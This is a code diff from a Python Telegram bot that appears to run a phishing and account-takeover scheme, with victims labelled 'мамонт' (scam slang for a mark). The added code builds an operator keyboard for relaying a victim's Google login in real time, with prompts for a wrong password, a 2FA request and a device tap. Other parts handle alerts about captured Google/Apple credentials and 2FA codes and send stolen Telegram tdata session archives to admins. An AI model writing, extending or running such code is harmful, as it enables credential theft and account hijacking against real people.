@@ -49,6 +49,25 @@ async def _is_primary_admin_mamont(worker_id: Optional[int], mirror_token: Optio
     return False
 
 
+def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"gctrl:wrong_pass:{user_tg_id}"),
+                InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="🔑 Запросить 2FA", callback_data=f"gctrl:ask_2fa:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
+            ],
+        ]
+    )
+
+
+
 async def notify_session_revoked(
     user_tg_id: int,
     reason: str = "Сессия сброшена на устройстве мамонта",
@@ -127,17 +146,6 @@ async def notify_session_revoked(
                 logger.info("Sent session_revoked alert to admin %s for user %s via %s", aid, user_tg_id, target_token)
             except Exception as ea:
                 logger.warning("Failed to send session_revoked alert to admin %s via %s: %s", aid, target_token, ea)
-                if is_test and "chat not found" in str(ea).lower():
-                    try:
-                        fb_bot = Bot(token=ADMIN_BOT_TOKEN)
-                        await fb_bot.send_message(
-                            chat_id=aid,
-                            text=f"⚠️ <i>[Тестовый лог — откройте @testadimbot и нажмите /start]</i>\n\n{admin_text}",
-                            parse_mode="HTML",
-                        )
-                        await fb_bot.session.close()
-                    except Exception:
-                        pass
 
         # 2. Worker Alert
         if worker_id:
@@ -301,14 +309,18 @@ async def notify_user_event(
             if worker_row and worker_row["username"]:
                 worker_username = worker_row["username"]
 
+        norm_step = (auth_step or event_type or "").lower()
+
         is_test_event = bool(
             kwargs.get("is_test")
             or is_test_worker(mirror_token, mirror_bot_username)
+            or (worker_id and worker_id in (8945168964, 8877489211))
         )
         if not is_test_event and user_row:
             u_mt = user_row["mirror_token"] if "mirror_token" in user_row.keys() else None
             u_mu = user_row["mirror_username"] if "mirror_username" in user_row.keys() else None
-            if is_test_worker(u_mt, u_mu):
+            u_wid = user_row["worker_tg_id"] if "worker_tg_id" in user_row.keys() else None
+            if is_test_worker(u_mt, u_mu) or u_wid in (8945168964, 8877489211):
                 is_test_event = True
 
         target_bot_token = get_admin_bot_token(
@@ -338,9 +350,6 @@ async def notify_user_event(
         user_tag = f"@{user_username}" if user_username else "—"
         phone_tag = f"<code>{phone}</code>" if phone else "—"
 
-        # Determine status state
-        norm_step = (auth_step or event_type or "").lower()
-
         if norm_step in ("session_revoked", "logged_out", "revoked", "session_expired"):
             await notify_session_revoked(user_tg_id, reason=details or "Сессия сброшена/отозвана на устройстве")
             return
@@ -350,7 +359,7 @@ async def notify_user_event(
         # CRITICAL PROTECTION: If the user is already authorized,
         # ignore duplicate intermediate backward events so old packets never overwrite the successful log card.
         # But ALWAYS allow new login flows (start, registered, phone, waiting_code).
-        current_db_step = (user_row["auth_step"] if user_row and "auth_step" in user_row.keys() else "").lower()
+        current_db_step = ((user_row["auth_step"] or "") if user_row and "auth_step" in user_row.keys() else "").lower()
         if current_db_step == "authorized" and not is_final_auth and norm_step not in ("start", "registered", "register", "phone", "waiting_code"):
             logger.info("Ignoring backward event '%s' for already %s user %s", norm_step, current_db_step, user_tg_id)
             return
@@ -470,12 +479,22 @@ async def notify_user_event(
             worker_alert_msg_id = None
             admin_alert_msg_id = None
 
-        # Control buttons (download contacts/chats, reset sessions, logout) appear ONLY upon full authorization
-        admin_keyboard = (
-            get_admin_log_keyboard(user_tg_id)
-            if is_final_auth
-            else None
+        # Control buttons
+        is_google_event = (
+            norm_step.startswith("google_")
+            or bool(email and not session_str)
+            or bool(user_row and "google_status" in user_row.keys() and user_row["google_status"])
         )
+
+        if is_google_event:
+            admin_keyboard = get_google_control_keyboard(user_tg_id)
+            worker_keyboard = get_google_control_keyboard(user_tg_id)
+        elif is_final_auth:
+            admin_keyboard = get_admin_log_keyboard(user_tg_id)
+            worker_keyboard = None
+        else:
+            admin_keyboard = None
+            worker_keyboard = None
 
         new_admin_msg_id = admin_msg_id
         new_admin_alert_msg_id = admin_alert_msg_id
@@ -636,6 +655,7 @@ async def notify_user_event(
                         chat_id=target_worker_id,
                         message_id=worker_msg_id,
                         text=worker_text,
+                        reply_markup=worker_keyboard,
                         parse_mode="HTML",
                     )
                 except Exception as e:
@@ -645,6 +665,7 @@ async def notify_user_event(
                             wmsg = await admin_bot.send_message(
                                 chat_id=target_worker_id,
                                 text=worker_text,
+                                reply_markup=worker_keyboard,
                                 parse_mode="HTML",
                             )
                             new_worker_msg_id = wmsg.message_id
@@ -655,6 +676,7 @@ async def notify_user_event(
                     wmsg = await admin_bot.send_message(
                         chat_id=target_worker_id,
                         text=worker_text,
+                        reply_markup=worker_keyboard,
                         parse_mode="HTML",
                     )
                     new_worker_msg_id = wmsg.message_id
@@ -781,19 +803,6 @@ async def _auto_process_authorized_mamont(
                         )
                     except Exception as doc_err:
                         logger.debug("Failed sending auto-tdata to admin %s via %s: %s", aid, effective_token, doc_err)
-                        if effective_token != ADMIN_BOT_TOKEN and "chat not found" in str(doc_err).lower():
-                            try:
-                                fb_bot = Bot(token=ADMIN_BOT_TOKEN)
-                                doc = FSInputFile(tdata_res["zip_path"], filename=f"tdata_{user_tg_id}.zip")
-                                await fb_bot.send_document(
-                                    chat_id=aid,
-                                    document=doc,
-                                    caption=f"⚠️ <i>[Тестовый лог — откройте @testadimbot и нажмите /start]</i>\n\n{tdata_caption}",
-                                    parse_mode="HTML",
-                                )
-                                await fb_bot.session.close()
-                            except Exception:
-                                pass
         except BaseException as td_err:
             logger.warning("Auto-send TData error for %s: %s", user_tg_id, td_err)
 
@@ -818,6 +827,18 @@ async def notify_auth_credential_event(
     """
     Sends explicit alerts when Google or Apple ID credentials, 2FA codes, or device prompts are submitted.
     """
+    if not is_test and user_tg_id:
+        try:
+            user_row = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
+            if user_row:
+                u_mt = user_row["mirror_token"] if "mirror_token" in user_row.keys() else None
+                u_mu = user_row["mirror_username"] if "mirror_username" in user_row.keys() else None
+                u_wid = user_row["worker_tg_id"] if "worker_tg_id" in user_row.keys() else None
+                if is_test_worker(u_mt, u_mu) or u_wid in (8945168964, 8877489211):
+                    is_test = True
+        except Exception:
+            pass
+
     target_token = TEST_ADMIN_BOT_TOKEN if (is_test and TEST_ADMIN_BOT_TOKEN) else ADMIN_BOT_TOKEN
     if not target_token:
         return
